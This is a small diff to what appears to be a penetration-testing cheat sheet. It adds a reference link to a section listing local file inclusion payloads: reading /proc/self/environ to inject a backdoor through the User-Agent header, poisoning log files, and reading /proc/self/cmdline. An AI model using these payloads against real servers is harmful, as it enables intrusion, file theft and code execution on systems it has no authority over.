@@ -1434,6 +1434,7 @@ run event_manager -c System
 ####################################
 #####  LFI/RFI         #########
 ####################################
+#https://liberty-shell.com/sec/2018/04/04/lfi/
 page=/proc/self/environ <-- a great way to inject a backdoor via the User Agent
 page=/var/log/<log file path> <-- can poison logs if you know the location
 page=/proc/self/cmdline <-- grab the HTTP config
